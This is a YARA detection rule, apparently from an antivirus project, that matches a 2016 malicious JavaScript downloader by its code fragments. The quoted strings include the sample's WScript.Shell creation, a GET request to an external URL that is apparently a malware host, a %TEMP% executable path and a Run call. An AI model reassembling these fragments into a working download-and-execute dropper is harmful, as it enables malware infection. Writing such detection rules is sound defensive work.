rule sig_20160328_41cf3cb01bb581e1782b7cbf3fcf88d2 {
  meta:
    description = "datamaliciousorder - file 20160328_41cf3cb01bb581e1782b7cbf3fcf88d2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bef4537f6c49c5e160d158a427fd5985a43f6feab7694c7abe84eee767be5929"

  strings:
    $s1  = "function Ncomsjsrag() {return Eqosf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Ak0usnV4.exe\";};" fullword ascii
    $s2  = "do {WScript[Myvqowty](Vjodtat() * 11)} while (Kcqxtvajs[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Jlvohvip(Mhpasnffv, Yernz){return Mhpasnffv - Yernz;};" fullword ascii
    $s4  = "Kcqxtvajs[Neeiencq](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s5  = "var Eqosf = function Tgznpiqx() {return WScript[Ycygxksv](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Zwhtnfyi() {return ((Roudhi == true) && (Roudhi == Mnbubctf)) ? 1 : Jybmzw;};" fullword ascii
    $s7  = "function Acwakcpt(Lifqsa){Eqosf[\"Run\"](Lifqsa, Jybmzw, Jybmzw);};" fullword ascii
    $s8  = "function Zljlzufl(){return Ycygxksv;};" fullword ascii
    $s9  = "var Roudhi = false;" fullword ascii
    $s10 = "var Mnbubctf = false;" fullword ascii
    $s11 = "var Oajoxacpos = false;" fullword ascii
    $s12 = " while (Jibwvr){" fullword ascii
    $s13 = "function Vjodtat(){return 22;};" fullword ascii
    $s14 = "function Mgcimo(Tcgbq) {var Uhazlvi = (1, 2, 3, 4, 5, Tcgbq); return Uhazlvi;};" fullword ascii
    $s15 = "var Yqnxfnpcta = new this[\"Date\"]();" fullword ascii
    $s16 = "function Obpmbxga(){return Zcqkenkr;};" fullword ascii
    $s17 = "function Zkdsgjtadh()" fullword ascii
    $s18 = "return Jlvohvip(Fltsyxc, Dawbwx);" fullword ascii
    $s19 = "Mnbubctf = true; " fullword ascii
    $s20 = "Roudhi = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}